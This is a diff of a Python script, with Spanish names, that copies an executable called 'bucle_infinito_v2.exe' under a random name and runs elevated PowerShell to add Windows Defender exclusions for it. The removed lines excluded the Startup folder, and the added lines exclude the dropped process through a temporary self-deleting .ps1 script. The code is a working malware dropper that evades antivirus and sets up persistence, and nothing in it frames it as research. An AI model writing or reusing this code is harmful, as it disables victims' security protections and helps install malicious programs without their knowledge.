@@ -3,16 +3,31 @@ import subprocess
 import os
 import random
 import string
+import tempfile
 
 archivo_origen = 'bucle_infinito_v2.exe'
-command1 = f"Add-MpPreference -ExclusionPath 'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'"
-cmd1 = ["powershell", "Start-Process", "powershell", "-Verb", "RunAs", "-ArgumentList", command1]
-subprocess.run(cmd1)
-
 
 # Generate a random string of length 8
 random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
 nombre_archivo_destino = f'il{random_string}.exe'
+
+# Command to be executed
+command2 = f"Add-MpPreference -ExclusionProcess '{nombre_archivo_destino}' -Force"
+
+
+# Create a temporary PowerShell script
+with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1', mode='w') as script_file:
+    script_file.write(command2)
+    script_path = script_file.name
+
+# Construct the command to run the script as administrator
+run_as_admin_command = f"powershell -Command \"& {{Start-Process powershell -Verb RunAs -ArgumentList '-File {script_path}'}}\""
+
+# Execute the command
+result = subprocess.run(run_as_admin_command, capture_output=True, text=True, shell=True)
+
+# Clean up: Delete the temporary script
+os.remove(script_path)
 
 def copiar_y_ejecutar(archivo_origen, nombre_archivo_destino):
     # Obtener la ruta del escritorio del usuario
@@ -39,8 +54,3 @@ def copiar_y_ejecutar(archivo_origen, nombre_archivo_destino):
         print(f"Ocurrió un error: {e}")
 
 copiar_y_ejecutar(archivo_origen, nombre_archivo_destino)
-
-command2 = f"Add-MpPreference -ExclusionPath 'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{nombre_archivo_destino}'"
-cmd2 = ["powershell", "Start-Process", "powershell", "-Verb", "RunAs", "-ArgumentList", command2]
-subprocess.run(cmd2)
-
